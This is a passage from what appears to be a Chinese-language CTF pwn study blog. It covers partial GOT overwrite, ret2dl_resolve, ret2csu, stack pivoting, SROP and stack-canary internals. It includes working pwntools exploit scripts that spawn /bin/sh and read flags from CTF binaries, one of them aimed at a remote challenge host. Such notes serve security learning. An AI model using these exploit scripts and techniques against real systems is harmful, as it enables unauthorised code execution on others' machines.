class="line">libc6_2.17-93ubuntu4_i386</span><br><span class="line">$ ./identify sha1=9054f5cb7969056b6816b1e2572f2506370940c4</span><br><span class="line">libc6_2.17-93ubuntu4_i386</span><br><span class="line">$ ./identify sha256=8dc102c06c50512d1e5142ce93a6faf4ec8b6f5d9e33d2e1b45311aef683d9b2</span><br><span class="line">libc6_2.17-93ubuntu4_i386</span><br></pre></td></tr></table></figure><h4 id="partial-overwrite">partial_overwrite</h4><h5 id="前置知识">前置知识</h5><p>针对没有泄露的赛题，可以考虑partial_overwrite改写<code>got</code>表，实现system，因为一般而言，大部分libc函数，里面都存在syscall，所以syscall偏移和函数head_addr差别不会太大。</p><p>考虑对于一个<code>got</code>表中的64位地址:  0xXXXXXXXXXXXXX， 假设其附近的syscall地址后三位偏移为0xaaa(请确定这个偏移和got内函数偏移只有最后四个16位数字不同)， 因为libc装载地址以页为单位，后三位是确定0x000，那么partial_overwrite覆盖后面两个字节， 即覆盖<code>got</code>为0xXXXXXXXXfaaa，那么有1/16的几率恰好syscall</p><h5 id="爆破脚本写法">爆破脚本写法</h5><p>一个爆破脚本模板:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">elf =<span class="string">&#x27;./ciscn_s_3&#x27;</span></span><br><span class="line">remote_add = <span class="string">&#x27;node4.buuoj.cn&#x27;</span></span><br><span class="line">remote_port = <span class="number">29554</span></span><br><span class="line"></span><br><span class="line">main_add = <span class="number">0x40051d</span></span><br><span class="line">off = <span class="number">0x130</span></span><br><span class="line">system_add = <span class="number">0x400517</span></span><br><span class="line">rtframe = <span class="number">0x4004da</span></span><br><span class="line">ret_add = <span class="number">0x4004e9</span></span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> i &lt; <span class="number">20</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">        context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">&#x27;r&#x27;</span>:</span><br><span class="line">            p = remote(remote_add, remote_port, timeout = <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">&#x27;d&#x27;</span>:</span><br><span class="line">            p = gdb.debug(elf)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            p = process(elf, timeout = <span class="number">1</span>)</span><br><span class="line">        payload1 = <span class="string">b&#x27;/bin/sh\0&#x27;</span> + cyclic(<span class="number">0x8</span>)</span><br><span class="line">        payload1+= p64(main_add)</span><br><span class="line"></span><br><span class="line">        p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">        stack_add = u64(p.recv(<span class="number">0x28</span>)[-<span class="number">8</span>::]) - off</span><br><span class="line"></span><br><span class="line">        frame = SigreturnFrame()</span><br><span class="line">        frame.rax = <span class="number">0x3b</span></span><br><span class="line">        frame.rdi = stack_add</span><br><span class="line">        frame.rsi = <span class="number">0</span></span><br><span class="line">        frame.rdx = <span class="number">0</span></span><br><span class="line">        frame.rsp = stack_add</span><br><span class="line">        frame.rip = system_add</span><br><span class="line"></span><br><span class="line">        payload = <span class="string">b&#x27;/bin/sh\0&#x27;</span> + cyclic(<span class="number">0x8</span>)</span><br><span class="line">        payload+= p64(rtframe)</span><br><span class="line">        payload+= p64(system_add)</span><br><span class="line">        payload+= <span class="built_in">bytes</span>(frame)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">#p.sendline(&#x27;a&#x27;)</span></span><br><span class="line">        <span class="comment">#p.recvuntil(&#x27;\0&#x27;)</span></span><br><span class="line">        p.sendline(payload)</span><br><span class="line">        p.recvuntil(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">        p.sendline(<span class="string">&#x27;cat flag&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(p.recvline())</span><br><span class="line">        </span><br><span class="line">        p.close()</span><br><span class="line">    <span class="keyword">except</span> BaseException <span class="keyword">as</span> e:</span><br><span class="line">        p.close()</span><br><span class="line"></span><br><span class="line">    off+=<span class="number">0x8</span></span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>核心模板:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    try:</span><br><span class="line"><span class="comment">// p = process()</span></span><br><span class="line"><span class="comment">// pass</span></span><br><span class="line">        p.sendline(<span class="string">&#x27;cat flag&#x27;</span>)</span><br><span class="line">        print(p.recvline())</span><br><span class="line">        p.close()</span><br><span class="line">    except BaseException as e:</span><br><span class="line">        p.close()</span><br><span class="line">    <span class="comment">// pass</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>采用grep 获取输出包含flag的行就行</p><h4 id="ret2dl-resolve">ret2dl_resolve()</h4><p>延迟绑定会使用_dl_resolve()函数</p><ul><li><p>_dl_resolve中</p><p>_dl_resolve调用_dl_fixup, _dl_dixup流程：</p><ol><li>通过link_map 获得.dynsym、.dynstr、.rel.plt地址</li><li>通过reloc_offset + ret.plt地址获得函数对应的Elf64_Rel指针</li><li>通过&amp;(ELF64_Rel)-&gt;r_info 和.dynsym取得对应Elf64_Sym指针</li><li>检查r_info</li><li>检查&amp;(Elf64_Sym)-&gt;st_other</li><li>通过strtab(DT_STRTAB中的地址)+st_name(.dymsym中的偏移)获得函数对应的字符串，进行查找，找到后赋值给rel_addr,最后调用这个函数</li></ol></li></ul><p>综合而言，有如下利用方法(参考CTF-wiki，主要是第三种，因为存在信息泄露时，可用其他方法)</p><table><thead><tr><th style="text-align:left"></th><th style="text-align:left">修改 dynamic 节的内容</th><th style="text-align:left">修改重定位表项的位置</th><th style="text-align:left">伪造 linkmap</th></tr></thead><tbody><tr><td style="text-align:left">主要前提要求</td><td style="text-align:left">无</td><td style="text-align:left">无</td><td style="text-align:left">无信息泄漏时需要 libc</td></tr><tr><td style="text-align:left">适用情况</td><td style="text-align:left">NO RELRO</td><td style="text-align:left">NO RELRO, Partial RELRO</td><td style="text-align:left">NO RELRO, Partial RELRO</td></tr><tr><td style="text-align:left">注意点</td><td style="text-align:left"></td><td style="text-align:left">确保版本检查通过；确保重定位位置可写；确保重定位表项、符号表、字符串表一一对应</td><td style="text-align:left">确保重定位位置可写；需要着重伪造重定位表项、符号表；</td></tr></tbody></table><h3 id="Tricks">Tricks</h3><h4 id="ret2csu">ret2csu</h4><p>csu主要是为了控制rdx，一般如果gadget较少， 可能没有直接rdx，<br>一个典型的csu如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000400940</span> loc_400940:                             ; CODE XREF: __libc_csu_init+<span class="number">54</span>↓j</span><br><span class="line">.text:<span class="number">0000000000400940</span>                 mov     rdx, r15</span><br><span class="line">.text:<span class="number">0000000000400943</span>                 mov     rsi, r14</span><br><span class="line">.text:<span class="number">0000000000400946</span>                 mov     edi, r13d</span><br><span class="line">.text:<span class="number">0000000000400949</span>                 call    ds:(__frame_dummy_init_array_entry - <span class="number">600</span>D90h)[r12+rbx*<span class="number">8</span>]</span><br><span class="line">.text:<span class="number">000000000040094</span>D                 add     rbx, <span class="number">1</span></span><br><span class="line">.text:<span class="number">0000000000400951</span>                 cmp     rbp, rbx</span><br><span class="line">.text:<span class="number">0000000000400954</span>                 jnz     <span class="type">short</span> loc_400940</span><br><span class="line">.text:<span class="number">0000000000400956</span></span><br><span class="line">.text:<span class="number">0000000000400956</span> loc_400956:                             ; CODE XREF: __libc_csu_init+<span class="number">34</span>↑j</span><br><span class="line">.text:<span class="number">0000000000400956</span>                 add     rsp, <span class="number">8</span></span><br><span class="line">.text:<span class="number">000000000040095</span>A                 pop     rbx</span><br><span class="line">.text:<span class="number">000000000040095B</span>                 pop     rbp</span><br><span class="line">.text:<span class="number">000000000040095</span>C                 pop     r12</span><br><span class="line">.text:<span class="number">000000000040095</span>E                 pop     r13</span><br><span class="line">.text:<span class="number">0000000000400960</span>                 pop     r14</span><br><span class="line">.text:<span class="number">0000000000400962</span>                 pop     r15</span><br><span class="line">.text:<span class="number">0000000000400964</span>                 retn</span><br></pre></td></tr></table></figure><p>那么通过0x400956和0x400940的组合，就可以控制rdx 了。<br>将r12+rbx*8 控制为一个无效got表项，并且令rbx比rbp大1，就可以循环劫持控制流了。</p><h4 id="stack-pivoting">stack pivoting</h4><p>栈迁移技巧， 主要针对可溢出字节较少的情况，通过<code>leave</code>此类指令控制rsp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">;leave 相当于:</span><br><span class="line">mov rsp,rbp</span><br><span class="line">pop rbp</span><br><span class="line">;那么考虑将栈帧中rbp地址改为栈迁移目的地址</span><br><span class="line">;leave两次之后，就可以将栈转移到目的地址</span><br><span class="line">;同时要现在目的地址布置好fake_stack</span><br></pre></td></tr></table></figure><p>可以知道，栈迁移的前提在于，需要提前布置好栈帧，即在.bss ，  或者.data等段写入，一般要求前面有读取到.data段的函数</p><p>不过，现在栈迁移一般会稍微复杂一些，读取类函数(如read)和leave可能在一个栈帧，这就要求我们在劫持read写入到指定地址的同时，实现分段栈迁移，大致流程如下:</p><ul><li>在第一次read读入后将rbp改为要写入的位置</li><li>ret到read</li><li>第二次read读入的数据将rbp改为写入的ROP链的位置，注意leave后的指令位置会加8</li><li>这个leave的加8会把我们的rip指向我们第二次写入时的ret位置，只要我们第二次写入的ret位置指向leave，就实现了第二次的栈迁移，迁移到了第二次写入的ROP链的位置</li></ul><h5 id="example">example</h5><p>一个程序反汇编后:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">48</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You can use stackoverflow.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;But only overflow a bit more...&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;And you must print first.&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x20</span>uLL);</span><br><span class="line">  write(<span class="number">1</span>, s, <span class="number">0x30</span>uLL);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x40</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个题目本身比较简单，本身给了你一个泄露，又只开了PIE，通过这个write的泄露可以拿到libc地址，考虑到题目还给了libc，预期解可能是找libc里面的/bin/sh字符串</p><p>但是既然没有开PIE，就没有必要这么麻烦了，直接在数据段写入/bin/sh就行</p><p><s>虽然大致脚本很早就写完了，但是运行发现了一些令人无语的错误</s></p><p><strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./ezrop&#x27;</span>)</span><br><span class="line"><span class="comment">#p = gdb.debug(&#x27;./ezrop&#x27;)</span></span><br><span class="line"></span><br><span class="line">m = u64(p.recv(<span class="number">40</span>)[-<span class="number">8</span>:])</span><br><span class="line"></span><br><span class="line">payloads = p64(<span class="number">0x400863</span>) + <span class="string">b&#x27;/bin/sh\0&#x27;</span> + p64(<span class="number">0x400600</span>)</span><br><span class="line"></span><br><span class="line">payloads += cyclic(<span class="number">0x18</span>)</span><br><span class="line">payloads += p64(<span class="number">0x601848</span>+<span class="number">0x30</span>) + p64(<span class="number">0x4007d9</span>)</span><br><span class="line"></span><br><span class="line">p.send(payloads)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payloads = p64(<span class="number">0x4006fa</span>) + p64(<span class="number">0x400863</span>) + p64(<span class="number">0x601868</span>) + p64(<span class="number">0x400600</span>) </span><br><span class="line">payloads += <span class="string">b&#x27;/bin/sh\0&#x27;</span></span><br><span class="line">payloads += <span class="string">b&#x27;/bin/sh\0&#x27;</span></span><br><span class="line">payloads += p64(<span class="number">0x601848</span>-<span class="number">0x8</span>) + p64(<span class="number">0x4007f9</span>)</span><br><span class="line"></span><br><span class="line">p.send(payloads)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment">#0x00007f7b3ce92bb0      0x00007f7b3ccf8450</span></span><br></pre></td></tr></table></figure><h4 id="栈对齐">栈对齐</h4><p>栈对齐是xmm指令的一个特性，网上对于这个特性的解释很多都是错误的，还把它与栈平衡搞混了。</p><p>这个特性来源于xmm相关指令需要内存对齐，当程序运行到这些指令时，如果内存不是16位对齐，就会直接coredump</p><p>可以:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ gdb -c core</span><br></pre></td></tr></table></figure><p>调试core文件</p><p>如果终止指令类似于:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7fa8677a3396</span>    movaps xmmword ptr [rsp + <span class="number">0x40</span>], xmm0</span><br></pre></td></tr></table></figure><p>说明是栈对齐的原因，小心调整栈帧就行</p><h4 id="Stack-smash">Stack smash</h4><p>对于某些将flag装载到内存，并且知道flag的地址、开启了cannary的题目而言，可以考虑stack_smash。</p><p>在开启cannary 防护的题目中，检测到栈溢出后，会调用 <code>__stack_chk_fail</code> 函数来打印 argv[0]  (在栈上，和环境变量在一起)指针所指向的字符串，而这个地址可以被覆盖，因此，可以利用此实现泄露flag</p><p>在链接高版本libc的情况下，已经不会再打印 <code>argv[0]</code> 了， 此方法已经失效</p><h4 id="SROP">SROP</h4><h5 id="前置知识-2">前置知识:</h5><p>在进程接收到signal时，内核会将其上下文保存位sigFrame，然后进入signal_handle，对信号处理，返回后，会执行sigreturn调用，恢复保存Frame，主要包括寄存器和控制流(rip，rsp)的一些设置。</p><p>那么，当我们伪造一个Frame，并且触发sigreturn调用时，就能控制寄存器和控制流，这也就是SROP的本质。</p><p>同一般rop链相比，可以自由控制rax，进一步的，可以自由控制系统调用，所以SROP拓展了ROP的attack methods。</p><p>SROP简要流程:</p><ol><li>构造fake_frame</li><li>控制当前rsp指向fake_frame底部</li><li>sigreturn调用</li></ol><p>sigFrame结构如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// x64</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* FPU environment matching the 64-bit FXSAVE layout.  */</span></span><br><span class="line">  <span class="type">__uint16_t</span>        cwd;</span><br><span class="line">  <span class="type">__uint16_t</span>        swd;</span><br><span class="line">  <span class="type">__uint16_t</span>        ftw;</span><br><span class="line">  <span class="type">__uint16_t</span>        fop;</span><br><span class="line">  <span class="type">__uint64_t</span>        rip;</span><br><span class="line">  <span class="type">__uint64_t</span>        rdp;</span><br><span class="line">  <span class="type">__uint32_t</span>        mxcsr;</span><br><span class="line">  <span class="type">__uint32_t</span>        mxcr_mask;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">fpxreg</span>    _<span class="title">st</span>[8];</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">xmmreg</span>    _<span class="title">xmm</span>[16];</span></span><br><span class="line">  <span class="type">__uint32_t</span>        padding[<span class="number">24</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigcontext</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">__uint64_t</span> r8;</span><br><span class="line">  <span class="type">__uint64_t</span> r9;</span><br><span class="line">  <span class="type">__uint64_t</span> r10;</span><br><span class="line">  <span class="type">__uint64_t</span> r11;</span><br><span class="line">  <span class="type">__uint64_t</span> r12;</span><br><span class="line">  <span class="type">__uint64_t</span> r13;</span><br><span class="line">  <span class="type">__uint64_t</span> r14;</span><br><span class="line">  <span class="type">__uint64_t</span> r15;</span><br><span class="line">  <span class="type">__uint64_t</span> rdi;</span><br><span class="line">  <span class="type">__uint64_t</span> rsi;</span><br><span class="line">  <span class="type">__uint64_t</span> rbp;</span><br><span class="line">  <span class="type">__uint64_t</span> rbx;</span><br><span class="line">  <span class="type">__uint64_t</span> rdx;</span><br><span class="line">  <span class="type">__uint64_t</span> rax;</span><br><span class="line">  <span class="type">__uint64_t</span> rcx;</span><br><span class="line">  <span class="type">__uint64_t</span> rsp;</span><br><span class="line">  <span class="type">__uint64_t</span> rip;</span><br><span class="line">  <span class="type">__uint64_t</span> eflags;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> cs;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> gs;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> fs;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> __pad0;</span><br><span class="line">  <span class="type">__uint64_t</span> err;</span><br><span class="line">  <span class="type">__uint64_t</span> trapno;</span><br><span class="line">  <span class="type">__uint64_t</span> oldmask;</span><br><span class="line">  <span class="type">__uint64_t</span> cr2;</span><br><span class="line">  __extension__ <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span> * <span class="title">fpstate</span>;</span></span><br><span class="line">      <span class="type">__uint64_t</span> __fpstate_word;</span><br><span class="line">    &#125;;</span><br><span class="line">  <span class="type">__uint64_t</span> __reserved1 [<span class="number">8</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h5 id="pwntools-srop">pwntools.srop</h5><p>pwntools集成了SROP的模块，可以帮助制作fake_frame:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// 一个简单的例子</span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_read</span><br><span class="line">sigframe.rdi = <span class="number">0</span></span><br><span class="line">sigframe.rsi = stack_addr</span><br><span class="line">sigframe.rdx = <span class="number">0x400</span></span><br><span class="line">sigframe.rsp = stack_addr</span><br><span class="line">sigframe.rip = syscall_ret</span><br></pre></td></tr></table></figure><h4 id="stack-gaurd">stack_gaurd</h4><p>我们都知道canary来自<code>fs:0x28</code>， <code>fs</code> 实际上指向的是<a href="http://www.openwall.com/lists/oss-security/2018/02/27/5">TCB</a> ， TCB结构如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">void</span> *tcb;                <span class="comment">/* Pointer to the TCB.  Not necessarily the</span></span><br><span class="line"><span class="comment">                           thread descriptor used by libpthread.  */</span></span><br><span class="line">  <span class="type">dtv_t</span> *dtv;</span><br><span class="line">  <span class="type">void</span> *self;                <span class="comment">/* Pointer to the thread descriptor.  */</span></span><br><span class="line">  <span class="type">int</span> multiple_threads;</span><br><span class="line">  <span class="type">int</span> gscope_flag;  <span class="comment">// not in 32bit</span></span><br><span class="line">  <span class="type">uintptr_t</span> sysinfo;</span><br><span class="line">  <span class="type">uintptr_t</span> stack_guard;</span><br><span class="line">  <span class="type">uintptr_t</span> pointer_guard;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">int</span> vgetcpu_cache[<span class="number">2</span>];</span><br><span class="line">  <span class="comment">/* Bit 0: X86_FEATURE_1_IBT.</span></span><br><span class="line"><span class="comment">     Bit 1: X86_FEATURE_1_SHSTK.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> feature_1;</span><br><span class="line">  <span class="type">int</span> __glibc_unused1;</span><br><span class="line">  <span class="comment">/* Reservation of some values for the TM ABI.  */</span></span><br><span class="line">  <span class="type">void</span> *__private_tm[<span class="number">4</span>];</span><br><span class="line">  <span class="comment">/* GCC split stack support.  */</span></span><br><span class="line">  <span class="type">void</span> *__private_ss;</span><br><span class="line">  <span class="comment">/* The lowest address of shadow stack,  */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> ssp_base;</span><br><span class="line">  <span class="comment">/* Must be kept even if it is no longer used by glibc since programs,</span></span><br><span class="line"><span class="comment">     like AddressSanitizer, depend on the size of tcbhead_t.  */</span></span><br><span class="line">  __128bits __glibc_unused2[<span class="number">8</span>][<span class="number">4</span>] __attribute__ ((aligned (<span class="number">32</span>)));</span><br><span class="line">  <span class="type">void</span> *__padding[<span class="number">8</span>];</span><br><span class="line">&#125; <span class="type">tcbhead_t</span>;</span><br></pre></td></tr></table></figure><p>0x28的偏移实际上是指向的stack_guard</p><p>那么如何确定段选择地址呢，我们知道段寄存器的基地址是不可见的，而且fs/gs可见的数值也不是段选择子而是0，所以在gdb中我们选择<code>pthread_self()</code> 来查看<code>fs</code>的地址，对比上面的结构，我们可以看到此函数其实是返回了结构体自身的地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">pthread_t</span></span><br><span class="line"><span class="title function_">pthread_self</span> <span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">pthread_t</span>) THREAD_SELF;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在gdb中查看这个地址，发现这个地址实际上在libc的附近。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p/x (tcbhead_t)*(tcbhead_t *)(pthread_self())</span><br><span class="line">p/x (void*)(pthread_self())</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">vmmap</span></span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">             Start                End Perm     Size Offset File</span><br><span class="line">    0x555555554000     0x555555555000 r--p     1000      0 /home/nemo/Pwn/workspace/2023ciscn/funcanary/funcanary</span><br><span class="line">    0x555555555000     0x555555556000 r-xp     1000   1000 /home/nemo/Pwn/workspace/2023ciscn/funcanary/funcanary</span><br><span class="line">    0x555555556000     0x555555557000 r--p     1000   2000 /home/nemo/Pwn/workspace/2023ciscn/funcanary/funcanary</span><br><span class="line">    0x555555557000     0x555555558000 r--p     1000   2000 /home/nemo/Pwn/workspace/2023ciscn/funcanary/funcanary</span><br><span class="line">    0x555555558000     0x555555559000 rw-p     1000   3000 /home/nemo/Pwn/workspace/2023ciscn/funcanary/funcanary</span><br><span class="line">    0x7ffff7dc7000     0x7ffff7dc9000 rw-p     2000      0 [anon_7ffff7dc7]</span><br><span class="line">    0x7ffff7dc9000     0x7ffff7def000 r--p    26000      0 /usr/lib64/libc.so.6</span><br><span class="line">    0x7ffff7def000     0x7ffff7f4c000 r-xp   15d000  26000 /usr/lib64/libc.so.6</span><br><span class="line">    0x7ffff7f4c000     0x7ffff7f99000 r--p    4d000 183000 /usr/lib64/libc.so.6</span><br><span class="line">    0x7ffff7f99000     0x7ffff7f9d000 r--p     4000 